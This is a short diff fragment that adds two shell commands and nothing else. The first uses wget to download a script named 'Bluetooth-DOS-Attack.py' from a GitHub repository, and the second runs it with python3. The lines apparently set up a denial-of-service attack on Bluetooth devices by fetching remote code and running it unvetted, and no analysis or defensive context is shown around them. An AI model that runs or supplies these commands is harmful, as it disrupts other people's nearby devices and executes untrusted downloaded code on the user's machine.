@@ -1,0 +1,3 @@
+wget https://raw.githubusercontent.com/crypt0b0y/BLUETOOTH-DOS-ATTACK-SCRIPT/refs/heads/master/Bluetooth-DOS-Attack.py
+
+python3 Bluetooth-DOS-Attack.py
